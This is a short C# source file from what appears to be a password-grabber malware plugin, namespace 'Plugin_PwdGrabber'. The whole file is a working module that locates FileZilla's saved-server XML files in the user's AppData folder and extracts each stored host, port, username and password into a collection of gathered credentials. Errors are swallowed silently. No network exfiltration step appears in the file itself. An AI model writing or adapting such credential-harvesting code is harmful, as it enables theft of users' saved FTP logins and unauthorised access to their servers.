using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;

namespace Plugin_PwdGrabber
{
    class Filezilla
    {
        private static string[] strFilenames = { "sitemanager.xml", "recentservers.xml" };
        private static string strFolderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "FileZilla");

        public static void Start()
        {
            foreach (string strFilename in strFilenames)
            {
                string strPath = Path.Combine(strFolderPath, strFilename);
                if (File.Exists(strPath))
                {
                    ReadServerFile(strPath);
                }
            }
        }

        private static void ReadServerFile(string Path)
        {
            try
            {
                XmlTextReader reader = new XmlTextReader(Path);
                XmlDocument objXmlDocument = new XmlDocument();
                objXmlDocument.Load(reader);

                foreach (XmlNode objXmlNode in objXmlDocument.DocumentElement.ChildNodes[0].ChildNodes)
                {
                    string Host = objXmlNode.ChildNodes[0].InnerText;
                    string Port = objXmlNode.ChildNodes[1].InnerText;
                    string Username = objXmlNode.ChildNodes[4].InnerText;
                    string Password = objXmlNode.ChildNodes[5].InnerText;

                    UserDataManager.GatheredCredentials.Add(new Credential("FileZilla", Host, Username, Password, Port));
                }
            }
            catch
            {
            }
        }
    }
}
